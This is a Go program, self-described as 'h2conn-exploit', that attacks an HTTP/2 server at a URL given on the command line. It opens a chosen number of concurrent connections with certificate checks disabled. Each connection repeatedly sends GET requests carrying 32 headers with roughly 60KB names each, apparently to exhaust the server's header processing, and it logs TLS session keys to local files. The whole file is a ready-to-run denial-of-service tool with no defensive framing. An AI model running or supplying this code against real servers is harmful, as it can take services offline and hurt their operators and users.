package main

import (
	"crypto/tls"
	"fmt"
	uuid2 "github.com/google/uuid"
	"golang.org/x/net/http2"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {

	if len(os.Args) != 3 {
		fmt.Println("Usage: h2conn-exploit <URL> <num of connections>")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	numConnStr := os.Args[2]

	numConn, err := strconv.Atoi(numConnStr)

	if err != nil {
		panic(err)
	}

	if numConn <= 0 {
		fmt.Println("Number of connections must be >= 0")
		os.Exit(1)
	}

	for conn := 1; conn <= numConn; conn++ {
		go exploitConn(targetURL, conn)
	}

	var block chan bool
	<-block
}

func genHeaderName() string {
	uuid := uuid2.NewString()
	sb := strings.Builder{}

	sb.Grow(60 << 10)
	for i := 0; i < sb.Cap(); i++ {
		sb.WriteString("n")
	}
	str60k := sb.String()
	return fmt.Sprintf("x-custom-%s-%s", uuid, str60k)
}

func exploit(url string) *http.Request {
	req, err := http.NewRequest(http.MethodGet, url, nil)

	if err != nil {
		panic(err)
	}

	for i := 0; i < 32; i++ {
		req.Header.Add(genHeaderName(), "some value")
	}

	return req
}

func req(client *http.Client, url string, prefix string, errors *int) {
	resp, err := client.Do(exploit(url))
	t := time.Now().UTC()
	if err != nil {
		*errors = *errors + 1
		fmt.Println(t, prefix, err, *errors)
		return
	}
	text, _ := io.ReadAll(resp.Body)
	fmt.Println(t, prefix, resp.Status, string(text))
	resp.Body.Close()
}

func exploitConn(url string, index int) {

	keylogFile, err := os.Create(fmt.Sprintf("conn-%d.keylog", index))

	if err != nil {
		panic(err)
	}
	defer keylogFile.Close()

	tlsConfig := &tls.Config{KeyLogWriter: keylogFile, InsecureSkipVerify: true}

	transport := &http2.Transport{
		TLSClientConfig: tlsConfig,
	}
	client := &http.Client{Transport: transport}
	errors := 0

	for {
		time.Sleep(10 * time.Second)
		req(client, url, fmt.Sprintf("Conn %d", index), &errors)
	}

}
